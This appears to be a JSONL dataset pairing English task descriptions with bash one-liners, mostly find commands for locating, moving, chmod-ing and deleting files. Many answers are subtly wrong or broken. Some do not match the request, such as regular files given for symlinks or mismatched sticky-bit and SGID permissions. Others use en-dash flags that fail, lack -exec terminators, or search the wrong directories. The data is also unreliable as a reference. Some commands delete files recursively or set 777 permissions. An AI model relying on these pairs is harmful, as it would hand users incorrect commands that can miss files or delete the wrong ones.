{"input": "Find all regular files starting from level 3 of directory tree ~/container and move them to the current directory's parent", "answer": "find ~/container  -mindepth 3 -type f -exec mv {} .. \\;"}
{"input": "Find all regular files that start with stat", "answer": "find . -type f \u2013iname stat*"}
{"input": "Find all regular files that were modified more than 60 days ago under '/path-to-directory' directory tree, sort them according to timestamp and print the filenames preceded with the timestamps", "answer": "find /path-to-directory -type f -mtime +60 -printf \"%T@ %p\\n\" | sort"}
{"input": "Find all regular files under  $somedir directory and print each of their paths after a string literal 'Found unexpected file '", "answer": "find \"$somedir\" -type f -exec echo Found unexpected file {} \\;"}
{"input": "Find all regular files under $DIR directory tree whose paths match the regex \".*\\.${TYPES_RE}\" where ${TYPES_RE} expands as a variable", "answer": "find ${DIR} -type f -regex \".*\\.${TYPES_RE}\""}
{"input": "Find all regular files under $DIR/tmp/daily/, sort them in reverse numerical order and copy the first two files to $DIR/tmp/weekly/", "answer": "find $DIR/tmp/daily/ -type f -printf \"%p\\n\" | sort -rn | head -n 2 | xargs -I{} cp {} $DIR/tmp/weekly/"}
{"input": "Find all regular files under $DIRECTORY_TO_PROCESS matching the case insensitive regex \".*\\.$FILES_TO_PROCES\" where $FILES_TO_PROCES is a variable and not matching the name pattern '$find_excludes' where $find_excludes is another variable, then print the files with null delimiter instead of newline", "answer": "find \"$DIRECTORY_TO_PROCESS\" -type f -iregex \".*\\.$FILES_TO_PROCES\" ! -name \"$find_excludes\" -print0"}
{"input": "Find all regular files under $FOLDER directory tree that start with '\".' and end with '\"' in their names and were modified in less than $RETENTION days excluding the files whose contents match one of the regular expressions defined per line in file $SKIP_FILE", "answer": "find ${FOLDER} -type f ! -name \\\".*\\\" -mtime -${RETENTION} | egrep -vf ${SKIP_FILE}"}
{"input": "Find all regular files under $SOURCE directory tree that were modified more than $KEEP days ago and show only the names without the paths", "answer": "find $SOURCE -type f -mtime +$KEEP | sed 's#.*/##'"}
{"input": "Find all regular files under $d directory tree and change their permissions to 777", "answer": "find \"$d/\" -type f -print0 | xargs -0 chmod 777"}
{"input": "Find all regular files under $dir directory tree that are bigger than $size MB in size and print them along with their sizes in decreasing order of size", "answer": "find $dir -type f -size +\"$size\"M -printf '%s %p\\n' | sort -rn"}
{"input": "Find all regular files under $dir directory tree with name pattern provided by the first positional parameter and show only the $num'th line from each of those files", "answer": "find $dir -type f -name $1 -exec sed $num'q;d' {} \\;"}
{"input": "Find all regular files under ${path} without following symlinks", "answer": "find ${path} -P -type f"}
{"input": "Find all regular files under '/home/john/scripts' directory tree excluding files with '.ksh' extension", "answer": "find /home/john/scripts -type f -not -name \"*.ksh\" -print"}
{"input": "Find all regular files under /home/www and replace every occurrences of 'subdomainA.example.com' with 'subdomainB.example.com' in those files", "answer": "find /home/www -type f -print0 | xargs -0 sed -i 's/subdomainA\\.example\\.com/subdomainB.example.com/g'"}
{"input": "Find all regular files under /home/www and replace every occurrences of 'subdomainA.example.com' with 'subdomainB.example.com' in those files invoking sed as few times as possible", "answer": "find /home/www/ -type f -exec sed -i 's/subdomainA\\.example\\.com/subdomainB.example.com/g' {} +"}
{"input": "Find all regular files under and below /home/admin/public_html/, and change their permissions to 644", "answer": "find . /home/admin/public_html/ -type f -exec chmod 644 {} \\;"}
{"input": "Find all regular files under and below /somepath that have extensions PDF, TIF, TIFF, PNG, JPG, JPEG, BMP, PCX, or DCX, ignoring the case and excluding \"*_ocr.pdf\" files", "answer": "find /somepath -type f -iregex \".*\\.(pdf\\|tif\\|tiff\\|png\\|jpg\\|jpeg\\|bmp\\|pcx\\|dcx)\" ! -name \"*_ocr.pdf\" -print0"}
{"input": "Find all regular files under current directory (excluding hidden directories) and replace every occurrences of 'subdomainA.example.com' with 'subdomainB.example.com' in those files", "answer": "find . \\( ! -regex '.*/\\..*' \\) -type f -print0 | xargs -0 sed -i 's/subdomainA.example.com/subdomainB.example.com/g'"}
{"input": "Find all regular files under current directory (no subdirectories) and replace every occurrences of 'toreplace' with 'replace' in those files", "answer": "find . -maxdepth 1 -type f -print0 | xargs -0 sed -i 's/toreplace/replaced/g'"}
{"input": "Find all regular files under current directory non-recursively that have execute permission set for all (user, group and other)", "answer": "find . -maxdepth 1 -type f -perm -uga=x"}
{"input": "Find all regular files under current directory tree and replace all '1.2.3.4' with '5.6.7.8' in these files modiying the files in-place", "answer": "find . -type f -exec sed -i \"s/1\\.2\\.3\\.4/5.6.7.8/g\" {} \\"}
{"input": "Find all regular files under current directory tree containing 'some text' in their names without descending into hidden directories and excluding hidden files", "answer": "find . -type d -path '*/\\.*' -prune -o -not -name '.*' -type f -name '*some text*' -print"}
{"input": "Find all regular files under current directory tree excluding files from './dir1' (except './dir1/subdir1/) and './dir2' directories", "answer": "find . \\( -not -path './dir1/*' -and -not -path './dir2/*' -or -path './dir1/subdir1/*' \\) -type f"}
{"input": "Find all regular files under current directory tree that contain 'some text' in their names excluding paths that contain dot files/directories", "answer": "find . -not -path '*/\\.*' -type f -name '*some text*'"}
{"input": "Find all regular files under current directory tree that match the regex 'tgt/etc/*' in their paths", "answer": "find . -type f -name \\* | grep \"tgt/etc/*\""}
{"input": "Find all regular files under current directory tree without descending into './dir1' (except './dir1/subdir1*' pattern) and './dir2' directories", "answer": "find . \\( -path './dir1/*' -and -not -path './dir1/subdir1*' -or -path './dir2' \\) -prune -or -type f -print"}
{"input": "Find all regular files under current directory tree, prepend '#' at the beginning of the lines that contain 'abc' in those files and modify them in-place", "answer": "find . -type f -exec sed -i 's/.*abc.*/#&/' {} \\;"}
{"input": "Find all regular files whose names contain a case insensitive pattern composed of space separated positional arguments and display a long listing of them", "answer": "find . -type f -iname '*'\"$*\"'*' -ls"}
{"input": "Find all regular files with '.jpg' (case insensitive) extension, sort them by name, print the output  and also save the list to file 'file_list.txt'", "answer": "find . -type f|grep -i \"\\.jpg$\" |sort| tee file_list.txt"}
{"input": "Find all regular files with '.r' and '.c' in their names under current directory tree", "answer": "find ./ -type f \\( -name '*.r*' -o -name '*.c*' \\) -print"}
{"input": "Find all regular files with '.txt' extension excluding 'README.txt' files under current directory tree", "answer": "find . -type f -name \"*.txt\" ! -name README.txt -print"}
{"input": "Find all regular files with '.what_to_find' extension in the entire filesystem and move them to directory '/new_directory'", "answer": "find / -iname \"*.what_to_find\" -type f -exec mv {} /new_directory \\;"}
{"input": "Find all regular files with case insensitive pattern '*$1*' ($1 expands to first positional parameter and falls back to empty string when not given) under current directory tree and execute a command given by $2 (falls back to 'file' command when $2 is not given) with each of those files as arguments", "answer": "find . -type f -iname '*'\"${1:-}\"'*' -exec ${2:-file} {} \\;"}
{"input": "Find all regular files with name pattern $filename under $fileloc directory tree", "answer": "find \"$fileloc\" -type f -prune -name \"$filename\" -print"}
{"input": "Find all regular files with permissions 777 under and below /home/user/demo/, and change their permissions to 755", "answer": "find /home/user/demo -type f -perm 777 -print -exec chmod 755 {} \\;"}
{"input": "Find all regular files with space in their names under current directory and rename them by replacing all spaces with _", "answer": "find -name \"* *\" -type f | rename 's/ /_/g'"}
{"input": "Find all regular files with the group read permission set in your home directory and below and output detailed information about each file", "answer": "find . -perm -g=r -type f -exec ls -l {} \\;"}
{"input": "Find all regular non-hidden files in the current directory and its subdirectories", "answer": "find . -not -path '*/\\.*' -type f \\( ! -iname \".*\" \\)"}
{"input": "Find all sample* files/directories under current directory and print 'program {}-out {}' where {} will expand to file paths", "answer": "find . -name \"sample*\" | xargs -i echo program {}-out {}"}
{"input": "Find all sample*_1.txt files/directories under current directory and print 'program  sample*-out sample*_1.txt sample*_2.txt' for each of them", "answer": "find . -name \"sample*_1.txt\" | sed -n 's/_1\\..*$//;h;s/$/_out/p;g;s/$/_1.txt/p;g;s/$/_2.txt/p' | xargs -L 3 echo program"}
{"input": "Find all strings matching pattern \"^${KEY}${DELIMITER}\" in $FILE file and print rest of string after $DELIMITER", "answer": "cat \"$FILE\" | grep \"^${KEY}${DELIMITER}\" | cut -f2- -d\"$DELIMITER\""}
{"input": "Find all subdirectories of the current directory except hidden ones", "answer": "find -maxdepth 1 -type d ! -name \".*\""}
{"input": "Find all symbolic links containing 'javaplugin' in their names under '/usr' directory tree", "answer": "find /usr/ -lname *javaplugin*"}
{"input": "Find all symbolic links starting from the current directory and list them", "answer": "find . -type l -ls"}
{"input": "Find all symbolic links under '/proc/$pid/fd' directory tree with name pattern '$save_path/sess_\\*' and update their timestamps", "answer": "find \"/proc/$pid/fd\" -ignore_readdir_race -lname \"$save_path/sess_\\*\" -exec touch -c {}"}
{"input": "Find all symbolic links under current directory that are not hard links", "answer": "find . -type f -links 1 -print"}
{"input": "Find all symbolic links under the current folder and below", "answer": "find \u2013L \u2013xtype l"}
{"input": "Find all target files outside the current working directory with symbolic links in the current working directory", "answer": "find . -type l -exec readlink -f '{}' \\; | grep -v \"^`readlink -f ${PWD}`\""}
{"input": "Find all test1.h files under current directory", "answer": "sudo find . -name test1.h"}
{"input": "Find all test2.h files under current directory", "answer": "sudo find . -name test2.h"}
{"input": "Find all text files in the home directory", "answer": "find ~/ -name '*.txt'"}
{"input": "Find all the *.c files at any level of directory Programming under any 'src' directory", "answer": "find ~/Programming -path '*/src/*.c'"}
{"input": "Find all the *.txt files in the current directory older than 48 hours", "answer": "find . -maxdepth 1 -name '*.txt' -mtime +2"}
{"input": "Find all the .c files in the current directory tree that contain the string 'stdlib.h'", "answer": "find . -name '*.c' | xargs grep 'stdlib.h'"}
{"input": "Find all the .mp3 files in the music folder and pass to the ls command, -print0 is required if any filenames contain whitespace", "answer": "find ./music -name \"*.mp3\" -print0 | xargs -0 ls"}
{"input": "Find all the .mp3 files in the music folder recursively and pass them to the ls command", "answer": "find ./music -name \"*.mp3\" -print0 | xargs -0 ls"}
{"input": "Find all the SGID bit files under current directory whose permissions set to 644 and show a few lines of output from the beginning", "answer": "find . -perm 0644 | head"}
{"input": "Find all the SGID bit files whose permissions set to 644", "answer": "find / -perm 2644"}
{"input": "Find all the SGID bit files whose permissions set to 644 in the file system", "answer": "find / -perm 2644"}
{"input": "Find all the Sticky Bit files whose permission are 551", "answer": "find / -perm 0551"}
{"input": "Find all the Sticky Bit set files in entire file system whose permission are 551", "answer": "find / -perm 0551"}
{"input": "Find all the Sticky Bit set files whose permission are 551", "answer": "find / -perm 1551"}
{"input": "Find all the Sticky Bit set files whose permission are 551 in the file system", "answer": "find / -perm 1551"}
{"input": "Find all the files in entire file system  which are accessed 50 days back", "answer": "find / -atime 50"}
{"input": "Find all the files in entire file system  which are modified 50 days back", "answer": "find / -mtime 50"}
{"input": "Find all the files in entire file system  which are modified more than 50 days back and less than 100 days and show a few lines of output from the beginning", "answer": "find / -mtime +50 -mtime -100 | head"}
{"input": "Find all the files in entire file system with the extensions txt or doc, as well as any file larger than 5MB in size", "answer": "find / \\( -name '*.txt' -o -name '*.doc' -o -size +5M \\)"}
{"input": "Find all the files in file system which are accessed 50 days back", "answer": "find / -atime 50"}
{"input": "Find all the files in file system which are greater than 50MB and less than 100MB", "answer": "find / -size +50M -size -100M"}
{"input": "Find all the files in file system which are modified 50 days back", "answer": "find / -mtime 50"}
{"input": "Find all the files in file system which are modified in last 1 hour", "answer": "find / -mmin -60"}
{"input": "Find all the files in file system which are modified more than 50 days back and less than 100 days", "answer": "find / -mtime +50 \u2013mtime -100"}
{"input": "Find all the files in the current directory", "answer": "find * -type f -print -o -type d -prune"}
{"input": "Find all the files in the current directory recursively whose permissions are 644 and show the first 10 of them", "answer": "find . -perm 0644 | head"}
{"input": "Find all the files in the current directory recursively whose permissions are not 777", "answer": "find . -type f ! -perm 777 | head"}
{"input": "Find all the files in the current directory with 'linkin park' in their names", "answer": "find . -maxdepth 1 -iname \"*linkin park*\""}
{"input": "Find all the files named 'vimrc' anywhere on the system", "answer": "find / -name vimrc"}
{"input": "Find all the files recursively in directories or files taken from the glob pattern /tmp/test/* that have been modified today", "answer": "find /tmp/test/* -mtime -0"}
{"input": "Find all the files that are not named \"MyCProgram.c\" in the current directory only and without regards to case", "answer": "find -maxdepth 1 -not -iname \"MyCProgram.c\""}
{"input": "Find all the files under /etc directory which are larger than 100k", "answer": "find /etc -size +100k"}
{"input": "Find all the files under /tmp directory and show a few lines of output from the beginning", "answer": "find /tmp  | head"}
{"input": "Find all the files which are accessed 50 days back", "answer": "find / -atime 50"}
{"input": "Find all the files which are greater than 50MB but less than 100MB in size", "answer": "find / -size +50M -size -100M"}
{"input": "Find all the files which are modified 50 days back", "answer": "find / -mtime 50"}
{"input": "Find all the files which are modified in last 1 hour", "answer": "find / -mmin -60"}
{"input": "Find all the files which are modified in last 1 hour in entire file system", "answer": "find / -mmin -60"}
{"input": "Find all the files which are modified more than 50 days back and less than 100 days", "answer": "find / -mtime +50 \u2013mtime -100"}
{"input": "Find all the files which were accessed 50 days ago", "answer": "find / -atime 50"}
{"input": "Find all the files which were modified 50 days ago", "answer": "find / -mtime 50"}
{"input": "Find all the files which were modified more than 50 days but less than 100 days ago", "answer": "find / -mtime +50 -mtime -100"}
{"input": "Find all the files whose name is FindCommandExamples.txt and contains both capital and small letters in / directory", "answer": "find  / -iname findcommandexamples.txt"}
{"input": "Find all the files whose name is FindCommandExamples.txt in the current working directory", "answer": "find /root -name FindCommandExamples.txt"}
{"input": "Find all the files whose name is tecmint.txt and contains both capital and small letters in /home directory", "answer": "find /home -iname tecmint.txt"}
{"input": "Find all the files whose permissions are 777", "answer": "find . -type f -perm 0777 -print"}
{"input": "Find all the files whose permissions are 777 in the current directory", "answer": "find . -type f -perm 0777 -print"}
{"input": "Find all the files whose permissions are 777 under current directory", "answer": "find . -type f -perm 0777 -print"}
{"input": "Find all the files without permission 777", "answer": "find / -type f ! -perm 777"}
{"input": "Find all the files/directories in the current directory tree which have been modified between 2014-08-25 and 2014-08-26", "answer": "find ./ -newermt 2014-08-25 ! -newermt 2014-08-26 -print"}
{"input": "Find all the files/directories in the entire filesystem that do not belong to user 'wnj' and are not newer than the file/directory 'ttt' by modification time", "answer": "find / \\! \\( -newer ttt -user wnj \\) -print"}
{"input": "Find all the files/directories under '/var/adm' directory tree that have not been modified in the last 3 days", "answer": "find /var/adm -mtime +3 -print"}
{"input": "Find all the files/directories under user's home directory that do not belong to the user $USER", "answer": "find ~ ! -user ${USER}"}
{"input": "Find all the files/directories with '.conf' extension under '/etc' directory non-recursively and display the last ten files", "answer": "find /etc -maxdepth 1 -name \"*.conf\" | tail"}
{"input": "Find all the regular files in $DIR directory tree which have not been modified in the last 15 days and delete them", "answer": "find \"$DIR\" -type f -mtime +15 -exec rm {} \\;"}
{"input": "Find all the regular files in $DIR directory tree which have not been modified in the last 450 days and delete them", "answer": "find $DIR -type f -mtime +450 -exec rm {} \\;"}
{"input": "Find all the regular files under $DIR directory tree which have been modified before the file $a excluding the file $a and delete them", "answer": "find \"$DIR\" -type f \\! -newer \"$a\" \\! -samefile \"$a\" -delete"}
{"input": "Find all the regular files under '/your/dir' directory tree which are bigger than 5 MB and display them in decreasing order of their sizes", "answer": "find /your/dir -type f -size +5M -exec du -h '{}' + | sort -hr"}
{"input": "Find all the regular files under current directory tree that have not been modified in the last 31 days and delete them", "answer": "find . -type f -mtime +31 -print0 | xargs -0 -r rm -f"}
{"input": "Find all the regular files with '.tgz' and '.gz' extensions and delete the oldest file under '/home/backups' directory tree", "answer": "find /home/backups -type f \\( -name \\*.tgz -o -name \\*.gz \\) -print0 | xargs -0 ls -t | tail -1 | xargs rm"}
{"input": "Find all xml files under current directory and archive them to .bz2 archives", "answer": "find -name \\*.xml -print0 | xargs -0 -n 1 -P 3 bzip2"}
{"input": "Find all xx* files/directories excluding 'xxx' files/directories under your home directory", "answer": "find ~ -name 'xx*' -and -not -name 'xxx'"}
{"input": "Find all your jsp's, map them to your localhost webserver, and invoke a wget (fetch) on them", "answer": "find -name \\*.jsp | sed 's/^/http:\\/\\/127.0.0.1/server/g' | xargs -n 1 wget"}
{"input": "Find all your text files", "answer": "find . -name \"*.txt\" -print"}
{"input": "Find all your text files and page through them", "answer": "find . -name \"*.txt\" -print | less"}
{"input": "Find an inode and remove", "answer": "find . -inum 968746 -exec rm -i {} \\;"}
{"input": "Find and clear UTF-8 files with BOM", "answer": "find . -type f -exec sed '1s/^\\xEF\\xBB\\xBF//' -i.bak {} \\; -exec rm {}.bak \\;"}
{"input": "Find and compress all .pl files in the current directory tree", "answer": "find . -name \"*.pl\" | xargs tar -zcf pl.tar.gz"}
{"input": "Find and copy all log files in the current directory tree to /tmp/log-files", "answer": "find . -name \\*.log -print0 | xargs -I{} -0 cp -v {} /tmp/log-files"}
{"input": "Find and delete all core files in the user's home directory and below", "answer": "find ~/ -name 'core*' -exec rm {} \\"}
{"input": "Find and delete all files with a used disk size of 0", "answer": "rm `du * | awk '$1 == \"0\" {print $2}'`"}
{"input": "Find and delete all hard links in the /home directory to file1", "answer": "find /home -xdev -samefile file1 -exec rm {} +"}
{"input": "Find and delete all hard links in the /home directory tree to file1", "answer": "find /home -xdev -samefile file1 | xargs rm"}
{"input": "Find and delete the file with inode number 1316256", "answer": "find ./ -inum 1316256 -delete"}
{"input": "Find and list all files on your current directory and show a few lines of output from the beginning", "answer": "find | head"}
{"input": "Find and print all PDF files in the current directory and its sub-directories except for any found in the ./pdfs directory", "answer": "find . -name \"*.pdf\" -print | grep -v \"^\\./pdfs/\""}
{"input": "Find and print detailed information about all regular files in your home directory and below that have only the group permission set", "answer": "find . -perm g=r -type f -exec ls -l {} \\;"}
{"input": "Find and print the full pathname of all PDF files in the current directory and its sub-directories", "answer": "find . -name \"*.pdf\" -print"}
{"input": "Find and print the names of all files found in the current directory and all of its sub-directories", "answer": "find ."}
{"input": "Find and remove all .core files", "answer": "find / -name \"*.core\" -print -exec rm {} \\;"}
{"input": "Find and remove all .mp3 regular files under the current directory and below", "answer": "find . -type f -name \"*.mp3\" -exec rm -f {} \\;"}
{"input": "Find and remove all .txt regular files under the current directory and below", "answer": "find . -type f -name \"*.txt\" -exec rm -f {} \\;"}
{"input": "Find and remove multiple *.mp3 files", "answer": "find . -type f -name \"*.mp3\" -exec rm -f {} \\;"}
{"input": "Find and remove multiple *.txt files", "answer": "find . -type f -name \"*.txt\" -exec rm -f {} \\;"}
{"input": "Find and remove multiple files such as *.mp3 or *.txt", "answer": "find . -type f -name \"*.mp3\" -exec rm -f {} \\;"}
{"input": "Find and remove multiple files such as *.mp3 or *.txt under current directory", "answer": "find . -type f -name \"*.mp3\" -exec rm -f {} \\;"}
{"input": "Find and remove the .rhosts file in the /home directory tree", "answer": "find /home -name .rhosts -print0 | xargs -0 rm"}
{"input": "Find and remove the file with inode number 782263 in the current directory tree", "answer": "find . -inum 782263 -exec rm -i {} \\;"}
{"input": "Find and remove zero bytes files from user's directories ", "answer": "find /usr/* -size 0c -exec rm {} \\;"}
{"input": "Find and show all files on the system that are larger than 900 MB", "answer": "find / -size +900M"}
{"input": "Find and the 5 largest regular files in the Downloads folder of tecmint's home directory and output the file sizes in bytes", "answer": "find /home/tecmint/Downloads/ -type f -printf \"%s %p\\n\" | sort -rn | head -n 5"}
{"input": "Find any files in the current directory and its sub-directories that were last accessed more than 7 days and are larger than 20480 blocks in size", "answer": "find . -atime +7 -size +20480 -print"}
{"input": "Find any files in the current directory and its sub-directories that were last accessed more than 7 days or are larger than 20480 blocks in size", "answer": "find . -atime +7 -o -size +20480 -print"}
{"input": "Find any hidden regular files in the current directory and its sub-directories that were modified after .cshrc was last modified", "answer": "find . -type f -name \".*\" -newer .cshrc -print"}
{"input": "Find apparent size of a target directory", "answer": "du -hs /path/to/directory"}
{"input": "Find blabla* files under current directory", "answer": "find . -depth -name \"blabla*\" -type f | xargs rm -f"}
{"input": "Find broken links using the file command on each symlinks in the system and searching for the keword 'broken' with grep", "answer": "find / -type l -print0 | xargs -0 file | grep broken"}
{"input": "Find broken symlinks in current directory", "answer": "find -L -type l"}
{"input": "Find command will display top 10 Big files from current directory ", "answer": "find . -type f -exec ls -s {} \\; |sort -n -r |head"}
{"input": "Find command will display top 5 small files from curent directory . most probably you will get ZERO  bytes files ", "answer": "find . -type f -exec ls -s {} \\; sort -n |head -5"}
{"input": "Find command will list of all files & directories from current directory , before listing echo command will display ' List of files & Directory '", "answer": "find . -exec echo ' List of files & Direcoty'   {} \\;"}
{"input": "Find deb packages in the current directory recursively", "answer": "find . -type f -and -iname \"*.deb\""}
{"input": "Find directories and regular files containing `blah' in their names modified less than 2 days ago, case insensitive", "answer": "find . -iname '*blah*' \\( -type d -o -type f \\) -mtime -2"}
{"input": "Find directories in /proc and show only those that doesn't match the regex '/proc/[0-9]*($|/)'", "answer": "find /proc -type d | egrep -v '/proc/[0-9]*($|/)' | less"}
{"input": "Find directories in the /path directory tree whose names are 33 characters in length", "answer": "find /path -type d -printf \"%f\\n\" | awk 'length==33'"}
{"input": "Find directories in the current directory (no sub-directories) and print them appended with a string literal 'Directory: '", "answer": "find . -maxdepth 1 -type d -print | xargs  -I \"^\" echo Directory: \"^\""}
{"input": "Find directories in the current directory recursively that are not \"executable\" by all", "answer": "find -type d ! -perm -111"}
{"input": "Find directories in the current directory tree that were modified within the last 24 hours and move them to /path/to/target-dir", "answer": "find . -depth -type d -mtime 0 -exec mv -t /path/to/target-dir {} +"}
{"input": "Find directories named 'work' under '/usr/ports/' directory tree and remove them", "answer": "find /usr/ports/ -name work -type d -print -exec rm -rf {} \\;"}
{"input": "Find directories owned by user news with permissions 775", "answer": "find / -user news -type d -perm 775 -print"}
{"input": "Find directories that are directly under $workspace_ts directory (no-subdirectories) and were modified more than 30 days ago", "answer": "find $workspace_ts -mindepth 1 -maxdepth 1 -type d -mtime +30 -print"}
{"input": "Find directories that are directly under /home/user/workspace directory (no-subdirectories) and were modified more than 30 days ago and print a message saying that the directory wasn't modified during last 30 days", "answer": "find /home/user/workspace -mindepth 1 -maxdepth 1 -type d -mtime +30 -execdir echo \"It seems that {} wasn't modified during last 30 days\" ';'"}
{"input": "Find directories under maximum 1 level down the directory $dir with 100 permission that are owned by the user $username", "answer": "find $dir -maxdepth 1 -type d -user $username -perm -100"}
{"input": "Find directories with permissions 777 and change them to 755 recursively", "answer": "find /home -type d -perm 777 -print -exec chmod 755 {} \\;"}
{"input": "Find directory \"/some/dir\" if it is empty", "answer": "find /some/dir/ -maxdepth 0 -empty"}
{"input": "Find directory \"your/dir\" if it is empty", "answer": "find your/dir -prune -empty"}
{"input": "Find disk usage of all files inside the directory", "answer": "du -a"}
{"input": "Find disk used space of only the target directory", "answer": "du --max-depth=0 ./directory"}
{"input": "Find every JavaScript file in the wordpress directory", "answer": "find wordpress -maxdepth 1 -name '*js'"}
{"input": "Find every JavaScript file in the wordpress directory tree", "answer": "find wordpress -name '*js'"}
{"input": "Find every directory under \"0001\" and make new directories replacing \"0001\" with \"0002\" at the beginning of their names", "answer": "find 0001 -type d | sed 's/^0001/0002/g' | xargs mkdir"}
{"input": "Find every vim undo file in the current directory tree", "answer": "find -type f -iname '*.un~'"}
{"input": "Find every vim undo file under current directory", "answer": "find -type f -iname '*.un~'"}
{"input": "Find executable files", "answer": "find . -perm -100 -print"}
{"input": "Find file `Chapter1' on the system", "answer": "find / -name Chapter1 -type f -print"}
{"input": "Find file `foo.bar' and delete it", "answer": "find /home -name foo.bar -type f -exec rm -f \"{}\" ';'"}
{"input": "Find file `hosts'", "answer": "find /etc -name hosts"}
{"input": "Find file names *blast* in specfied directory", "answer": "find /usr/local -name \"*blast*\""}
{"input": "Find file names *blast* in specfied directory, case insensitive", "answer": "find /usr/local -iname \"*blast*\""}
{"input": "Find file size in bytes", "answer": "du -b FILE"}
{"input": "Find file1 in the level 1 directories and above", "answer": "find -maxdepth 2 -name file1"}
{"input": "Find files accessed at 23:59", "answer": "find . -atime -1 -print"}
{"input": "Find files and directories in the /tmp/ tree that contain spaces in their names and replace those spaces with underscores", "answer": "find /tmp/ -depth -name \"* *\" -execdir rename 's/ /_/g' \"{}\" \\;"}
{"input": "Find files and directories owned by xuser1 and change their ownership to user2", "answer": "find . -user xuser1 -exec chown -R user2 {} \\;"}
{"input": "Find files and directories that are at least seven levels of nesting in the directory /usr/src", "answer": "find /usr/src -name CVS -prune -o -mindepth 7 -print"}
{"input": "Find files and directories that are at least seven levels of nesting in the directory /usr/src excluding CVS directory", "answer": "find /usr/src -name CVS -prune -o -depth +6 -print"}
{"input": "Find files and directories with group id 1003", "answer": "find . -gid 1003"}
{"input": "Find files and directories with the name RAID but don't traverse a particular directory", "answer": "find . -name RAID -prune -o -print"}
{"input": "Find files associated with an inode", "answer": "find . -inum 968746 -exec ls -l {} \\;"}
{"input": "Find files belonging to the given owner", "answer": "find /path/to/search -user owner"}
{"input": "Find files containing string \"#!/bin/ksh\" and append their names and matching strings to /tmp/allfiles", "answer": "find . -type f -execdir /usr/bin/grep -iH '#!/bin/ksh' {} \\; | tee /tmp/allfiles"}
{"input": "Find files created in the last minute; works on Mac OS X", "answer": "find / -newerct '1 minute ago' -print"}
{"input": "Find files ending in \"*macs\"", "answer": "find -name '*macs'"}
{"input": "Find files ending in \"config\"", "answer": "find .  -path '*/*config'"}
{"input": "Find files ending in \"f\"", "answer": "find .  -path '*f'"}
{"input": "Find files in $DIR_TO_CLEAN that are older than $DAYS_TO_SAVE days and print them with null character appended to their paths", "answer": "find \"${DIR_TO_CLEAN?}\" -type f -mtime +${DAYS_TO_SAVE?} -print0"}
{"input": "Find files in and below the current directory whose names begin with \"not\" and remove one of them", "answer": "find . -name not\\* | tail -1 | xargs rm"}
{"input": "Find files in entire file system that are writable by group or other", "answer": "find / -perm /g+w,o+w"}
{"input": "Find files in the \"dir\" directory tree whose names are 33 characters in length", "answer": "find dir -name '?????????????????????????????????'"}
{"input": "Find files in the /home/user directory tree changed exactly 10 minutes ago", "answer": "find /home/user/ -cmin 10 -print"}
{"input": "Find files in the /travelphotos that are greater than 200k in size but do not have \"2015\" anywhere in the file name", "answer": "find /travelphotos -type f -size +200k -not -iname \"*2015*\""}
{"input": "Find files in the /var/log folder which were modified an hour or more ago", "answer": "find /var/log/ -mmin +60"}
{"input": "Find files in the /var/log folder which were modified between 60 minutes and 10 minutes ago", "answer": "find /var/log/ -mmin -60 -mmin +10"}
{"input": "Find files in the /var/log folder which were modified modified 2 weeks ago", "answer": "find /var/log/ -mtime +7 -mtime -8"}
{"input": "Find files in the current directory and below that are 2000 kB in size", "answer": "find . -size 2000k -print"}
{"input": "Find files in the current directory excluding CVS, SVN, GIT repository files and all binary files", "answer": "find . -not \\( -name .svn -prune -o -name .git -prune -o -name CVS -prune \\) -type f -print0 | xargs -0 file -n | grep -v binary | cut -d \":\" -f1"}
{"input": "Find files in the current directory recursively that are not readable by all", "answer": "find -type f ! -perm -444"}
{"input": "Find files in the current directory tree of size between 700k and 1000k", "answer": "find . \\( -size +700k -and -size -1000k \\)"}
{"input": "Find files in the current directory tree that are named \"some_pattern\" and move them to directory \"target_location\"", "answer": "find . -name some_pattern -print0 | xargs -0 -i mv {} target_location"}
{"input": "Find files in the current directory tree that have one link", "answer": "find . -links 1"}
{"input": "Find files in the current directory tree that match pattern \"*sub*\"", "answer": "find ./ -name \"*sub*\""}
{"input": "Find files in the current directory tree which have permissions rwx for user and rw for group and others", "answer": "find . -perm 766"}
{"input": "Find files in the current directory tree whose names are of the form \"cxx_data.txt\" where xx is a number from 30 to 70", "answer": "find . -regextype posix-egrep -regex '.\\*c([3-6][0-9]|70).\\*'"}
{"input": "Find files in the current directory tree whose names are of the form \"cxx_data.txt\" where xx is a number from 40 to 70", "answer": "find . -regextype posix-egrep -regex \"./c(([4-6][0-9])|70)_data.txt\""}
{"input": "Find files in the current directory tree whose names begin with \"file\" and whose size is 0, and remove them", "answer": "find -name 'file*' -size 0 -delete"}
{"input": "Find files in the current directory tree whose names match regular expression \"^.*~$\\|^.*#$\"", "answer": "find -regex \"^.*~$\\|^.*#$\""}
{"input": "Find files in the current directory tree whose pathnames contain \"sub\"", "answer": "find ./ | grep \"sub\""}
{"input": "Find files in the current directory whose names begin with \"file\" and remove them", "answer": "find . -name file* -maxdepth 1 -exec rm {} \\;"}
{"input": "Find files in two different directories (esofthub and esoft) having the \"test\" string and list them", "answer": "find esofthub esoft -name \"*test*\" -type f -ls"}
{"input": "Find files larger than 100MB in /var/www and exclude files with /download/ in their path from the output", "answer": "find /var/www/ -type f -name \"*\" -size +100M -exec du -h '{}' \\;|grep -v /download/"}
{"input": "Find files matching `.ssh*' and append their anmes to file `ssh-stuff'", "answer": "find / -name .ssh* -print | tee -a ssh-stuff"}
{"input": "Find files matching an exact set of permissions", "answer": "find / -perm 644"}
{"input": "Find files matching pattern $2 in the $1 directory recursively and search them for text $3, where $1, $2, $3 are the command line arguments to the Bash script", "answer": "find $1 -name \"$2\" -exec grep -Hn \"$3\" {} \\;"}
{"input": "Find files matching regular expression regexp", "answer": "find . | xargs grep regexp"}
{"input": "Find files modified at least 5 days in the future", "answer": "find . -newermt \"5 days\""}
{"input": "Find files modified between 6 and 9 minutes ago", "answer": "find . -mmin +5 -mmin -10"}
{"input": "Find files modified within the past 24 hours", "answer": "find . -mtime 0"}
{"input": "Find files named \"blabla\" in the current directory tree and print the number of lines in each of them", "answer": "find ./ -name \"blabla\" -exec wc -l {} ;"}
{"input": "Find files named 'core' in or below the directory /tmp and delete them", "answer": "find /tmp -depth -name core -type f -delete"}
{"input": "Find files named 'fileName.txt' under '/path/to/folder' directory tree ignoring 'ignored_directory'", "answer": "find /path/to/folder -name fileName.txt -not -path \"*/ignored_directory/*\""}
{"input": "Find files named core in or below the directory /tmp and delete them, processing filenames in such a way that file or directory names containing single or double quotes, spaces or newlines are correctly handled", "answer": "find /tmp -name core -type f -print0 | xargs -0 /bin/rm -f"}
